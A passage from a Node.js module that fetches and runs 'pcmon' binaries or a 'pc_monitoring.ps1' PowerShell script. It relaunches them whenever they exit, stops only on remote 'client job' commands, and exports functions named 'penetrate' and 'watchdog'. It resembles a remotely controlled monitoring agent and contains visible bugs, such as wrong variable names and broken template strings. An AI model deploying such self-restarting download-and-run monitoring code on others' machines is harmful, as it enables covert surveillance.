    const pcmon_func = lib.func("__stdcall", "pcmon_main", "int", []);
    pcmon_func();
}

async function pcmon_tpl() {
    let dllpath = path.join(systemconfig.pcmondir, "pcmon.dll");

    if (!helper.fileExists(dllpath)) {
        await download_pcmon();

        if (!helper.fileExists(dllpath)) {
            throw new Error("failed to download pcmon.dll");
        }
    }

    try {
        launch_pcmon_koffi();
    } catch (err) {
        helper.logmsg(err);
    }
}

async function pcmon() {
    helper.logmsg("starting");

    let pcmoncmd = systemconfig.cmdconfig;

    if (systemconfig.istpl) {
        await pcmon_tpl();
        return;
    }

    let exepath = path.join(systemconfig.pcmondir, "pcmon.exe");

    if (!helper.fileExists(exepath)) {
        await download_pcmon();

        if (!helper.fileExists(exepath)) {
            throw new Error("failed to download pcmon.exe");
        }
    }

    let killswitch = false;

    handleMessage = (msgobj) => {
        let clientjob = msg?.payload ?? null;

        if (!clientjob) {
            throw new Error("unable to extract clientjob");
        }

        helper.logmsg("received new client job: " + JSON.stringify(clientjob));

        if (clientjob?.cmdname.toLowerCase() == "StopPCMon".toLowerCase()) {
            killswitch = true;
        }
    };

    let childp = null;

    pcmoncmd.loopfunc = () => {
        helper.logmsg(`{pcmoncmd.cmdname} looping...`);

        let tcmdpid = childp?.pid ?? -1;

        if (killswitch) {
            if (isPidAlive(tcmdpid)) childp.kill();

            if (isPidAlive(tcmdpid)) childp.kill("SIGKILL");
        }

        if (!killswitch && !isPidAlive(tcmdpid)) {
            childp = invoke_exe("pcmon.exe");
        }
    };

    pcmoncmd.loop();

    helper.logmsg("finished");
}

async function pspcmon() {
    helper.logmsg("starting");

    let pspcmoncmd = systemconfig.cmdconfig;

    let scriptfpath = path.join(systemconfig.pspcmondir, "pc_monitoring.ps1");

    if (!helper.fileExists(scriptfpath)) {
        await download_pspcmon();
    }

    if (!helper.fileExists(scriptfpath)) {
        throw new Error("pspcmon script does not exist " + scriptfpath);
    }

    let killswitch = false;

    handleMessage = (msgobj) => {
        let clientjob = msg?.payload ?? null;

        if (!clientjob) {
            throw new Error("unable to extract clientjob");
        }

        helper.logmsg("received new client job: " + JSON.stringify(clientjob));

        if (clientjob?.cmdname.toLowerCase() == "StopPSPCMon".toLowerCase()) {
            killswitch = true;
        }
    };

    let childp = null;

    pspcmoncmd.loopfunc = () => {
        helper.logmsg(`{pspcmoncmd.cmdname} looping...`);

        let tcmdpid = childp?.pid ?? -1;

        if (killswitch) {
            if (isPidAlive(tcmdpid)) childp.kill();

            if (isPidAlive(tcmdpid)) childp.kill("SIGKILL");
        }

        if (!killswitch && !isPidAlive(tcmdpid)) {
            childp = execPSScript(scriptfpath);
        }
    };

    pspcmoncmd.loop();

    helper.logmsg("finished");
}

module.exports = {
    CmdConfig,
    penetrate,
    watchdog,

}